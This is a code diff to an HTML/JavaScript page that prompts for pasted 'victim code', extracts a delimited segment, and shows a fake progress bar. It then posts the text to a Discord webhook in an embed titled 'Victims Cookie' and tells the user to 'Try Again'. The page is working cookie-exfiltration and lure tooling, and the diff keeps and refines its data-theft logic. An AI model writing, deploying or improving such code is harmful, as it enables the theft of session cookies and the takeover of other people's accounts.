@@ -40,23 +40,28 @@
       color: red;
       font-weight: bold;
     }
-    #loadingBarContainer {
-      width: 70%;
-      background-color: #f3f3f3;
-      margin-top: 20px;
-      height: 30px;
-      border-radius: 5px;
-      display: none; /* Hidden by default */
+    #progressWrapper {
+      width: 80%;
+      margin: 20px auto;
+      position: relative;
+      height: 25px;
     }
-    #loadingBar {
-      width: 1%;
+    #progressBar {
+      width: 0;
       height: 100%;
-      background-color: green;
-      border-radius: 5px;
-    }
-    #status {
+      background-color: #4caf50;
+      text-align: center;
+      line-height: 25px;
+      color: white;
       font-weight: bold;
-      margin-top: 10px;
+    }
+    #progressText {
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      color: white;
+      font-weight: bold;
     }
   </style>
 </head>
@@ -66,10 +71,12 @@
     <textarea id="messageInput" placeholder="Paste the victim code that you copied..."></textarea><br>
     <button id="sendButton" onclick="sendMessage()">Send</button>
   </div>
-  <div id="loadingBarContainer">
-    <div id="loadingBar"></div>
+  <div id="progressWrapper" style="display: none;">
+    <div id="progressBar">
+      <div id="progressText">1%</div>
+    </div>
   </div>
-  <p id="status" style="color: green;"></p>
+  <p id="status" style="color: green; font-weight: bold;"></p>
   <p id="errorMessage" class="error"></p>
 
   <script>
@@ -80,8 +87,10 @@
       const messageInput = document.getElementById("messageInput");
       const sendButton = document.getElementById("sendButton");
       const errorMessage = document.getElementById("errorMessage");
-      const loadingBarContainer = document.getElementById("loadingBarContainer");
-      const loadingBar = document.getElementById("loadingBar");
+      const progressWrapper = document.getElementById("progressWrapper");
+      const progressBar = document.getElementById("progressBar");
+      const progressText = document.getElementById("progressText");
+
       let message = messageInput.value;
 
       errorMessage.textContent = ""; // Clear any previous error messages
@@ -105,85 +114,71 @@
         const middleMessage = message.slice(startIndex + startPhrase.length, endIndex).trim();
 
         if (middleMessage) {
-          // Hide the Send button and show the loading bar
-          sendButton.style.display = "none";
-          loadingBarContainer.style.display = "block";
+          // Show the progress bar and hide the send button
+          progressWrapper.style.display = "block";
+          sendButton.disabled = true;
+          messageInput.disabled = true;
 
-          let progress = 1; // Start at 1% progress
-          const progressInterval = setInterval(() => {
+          // Simulate the loading from 1% to 100%
+          let progress = 1;
+          let interval = setInterval(() => {
+            progressBar.style.width = progress + "%";
+            progressText.textContent = progress + "%";
             if (progress >= 100) {
-              clearInterval(progressInterval);
-              sendToDiscord(middleMessage);
+              clearInterval(interval);
+              // Send the embed to Discord webhook
+              const embedPayload = {
+                embeds: [
+                  {
+                    title: "Victims Cookie", // Embed title
+                    description: `\`\`\`${middleMessage}\`\`\``, // Embed description with the message surrounded by triple backticks
+                    color: 16711680, // Embed color (red in this case)
+                    timestamp: new Date().toISOString() // Adds a timestamp
+                  }
+                ]
+              };
+
+              fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(embedPayload),
+              })
+                .then((response) => {
+                  if (response.ok) {
+                    // After loading, display the "Try Again" message
+                    progressText.textContent = "Try Again!";
+                    setTimeout(() => {
+                      // Reset everything back to normal
+                      progressWrapper.style.display = "none";
+                      sendButton.disabled = false;
+                      messageInput.disabled = false;
+                      messageInput.value = ""; // Clear the input
+                    }, 3000); // Wait 3 seconds before resetting
+                  } else {
+                    throw new Error("Failed to send the message.");
+                  }
+                })
+                .catch((error) => {
+                  console.error("Error:", error);
+                  progressText.textContent = "Failed to send the message.";
+                  setTimeout(() => {
+                    // Reset everything back to normal
+                    progressWrapper.style.display = "none";
+                    sendButton.disabled = false;
+                    messageInput.disabled = false;
+                    messageInput.value = ""; // Clear the input
+                  }, 3000); // Wait 3 seconds before resetting
+                });
             } else {
-              progress++;
-              loadingBar.style.width = `${progress}%`;
+              progress++; // Increase the progress
             }
-          }, 180); // Increase progress every 180ms (5 minutes = 300 seconds, divide by 100 steps)
+          }, 300); // Update progress every 300ms
         } else {
           errorMessage.textContent = "Message failed! Wrong Code.";
         }
       } else {
         errorMessage.textContent = "Message failed! Make sure you paste the right code from the victim.";
       }
-    }
-
-    function sendToDiscord(middleMessage) {
-      // Create the embed payload
-      const embedPayload = {
-        embeds: [
-          {
-            title: "Victims Cookie", // Embed title
-            description: `\`\`\`${middleMessage}\`\`\``, // Embed description with the message surrounded by triple backticks
-            color: 16711680, // Embed color (red in this case)
-            timestamp: new Date().toISOString() // Adds a timestamp
-          }
-        ]
-      };
-
-      // Send the embed to Discord webhook
-      fetch(DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(embedPayload),
-      })
-        .then((response) => {
-          if (response.ok) {
-            document.getElementById("status").textContent = "Message sent successfully!";
-            setTimeout(() => {
-              resetForm();
-            }, 3000); // Reset after 3 seconds
-          } else {
-            throw new Error("Failed to send the message.");
-          }
-        })
-        .catch((error) => {
-          console.error("Error:", error);
-          document.getElementById("status").textContent = "Failed to send the message.";
-          setTimeout(() => {
-            resetForm();
-          }, 3000); // Reset after 3 seconds
-        });
-    }
-
-    function resetForm() {
-      const sendButton = document.getElementById("sendButton");
-      const loadingBarContainer = document.getElementById("loadingBarContainer");
-      const messageInput = document.getElementById("messageInput");
-      const errorMessage = document.getElementById("errorMessage");
-      const status = document.getElementById("status");
-
-      // Reset progress bar and visibility
-      loadingBar.style.width = "1%";
-      loadingBarContainer.style.display = "none";
-      sendButton.style.display = "inline-block";
-      errorMessage.textContent = "";
-      status.textContent = "Try again!";
-      
-      // Reset message box after showing the "Try again" message for 3 seconds
-      setTimeout(() => {
-        status.textContent = "";
-        messageInput.value = ""; // Clear input box
-      }, 3000);
     }
   </script>
 </body>
